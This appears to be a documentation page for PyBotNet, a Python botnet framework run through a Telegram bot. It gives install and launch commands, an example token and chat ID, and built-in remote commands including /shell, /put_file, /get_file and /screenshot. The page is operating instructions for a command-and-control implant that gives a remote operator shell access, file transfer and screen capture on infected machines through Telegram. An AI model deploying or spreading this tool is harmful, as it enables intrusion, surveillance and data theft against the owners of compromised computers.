
We have seen before that we need some code to run pybotnet, but it is possible to run pybotnet as a module

All you have to do is, install PyBotNet on your system and enter the following command in your terminal:


### Install PyBotNet:
```console
pip3 install pybotnet -U
```

!!! note

    `-U`: make sure to upgrade framework to latest version.

---

### Run PyBotNet:

```console
python3 -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]
```

For example :

```console
python3 -m pybotnet -t 5526760482:AAGweoNtLrHEsasxnklwhjms78ytPS3U8gEO6asc -i 5590231667 -n test
```

!!! note
    * `TELEGRAM_TOKEN`: You can use telegram `@botfather` to create new telegram API Bot and get your `TELEGRAM_TOKEN` 
    * `ADMIN_CHAT_ID`: Get it from @userinfobot Telegram bot
    * PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/screenshot`, `/who`, ...,
     you can send `/help` to your telegram bot and see more detail..
